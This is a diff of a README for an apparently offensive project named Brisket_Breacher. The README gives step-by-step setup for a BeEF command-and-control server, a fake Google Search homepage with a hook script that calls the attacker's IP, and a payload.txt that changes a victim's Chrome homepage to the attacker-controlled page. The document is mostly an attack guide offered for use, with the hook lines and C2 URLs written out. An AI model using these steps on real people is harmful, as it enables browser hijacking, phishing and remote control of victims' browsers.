@@ -29,7 +29,7 @@ Due to the payload changing the homepage in the settings of the Google Chrome br
 2. Install BeEF:
     - `sudo apt install beef-xss -y`
      
-3. Download the [homepage.html]() file (described next). This will be the homepage that our malicious URL will point to and deliver the BeEF C2 hook.
+3. Download the homepage.html file in the Brisket_Breacher directory (described next). This will be the homepage that our malicious URL will point to and deliver the BeEF C2 hook.
     - Open the homepage.html and edit the BeEF C2 hook (line 141 `<script src="http://X.X.X.X:3000/hook.js"></script>`) with the IP address gathered from `ifconfig` of the attacker machine and then save the updated file. E.g., `<script src="http://192.168.8.100:3000/hook.js"></script>`.
     - Become root: `sudo su`.
     - With the homepage.html file in your current working directory, move it to the following directory: `mv homepage.html /usr/share/beef-xss/extensions/demos/html`.
@@ -47,7 +47,7 @@ The homepage was designed to imitate a typical Google Search landing page. Multi
 ![googlesearch](https://github.com/user-attachments/assets/1a428553-52d5-417b-aabb-5fc053c33ea8)
 
 ## payload.txt
-The [payload.txt]() file is the delivery system for configuration of the Google Chrome browser.
+The payload.txt file is the delivery system for configuration of the Google Chrome browser.
 
 **The URL pointing to the BeEF C2 must be defined in line 7 of the payload.txt.** The URL to the BeEF C2 is the following: `http://x.x.x.x:3000/demos/homepage.html` (replacing the IP parameter with the IP address of the attacker machine). E.g., `http://192.168.8.100:3000/demos/homepage.html`. This will point to the homepage.html file that has been previously configured during the BeEF C2 setup stage.
 
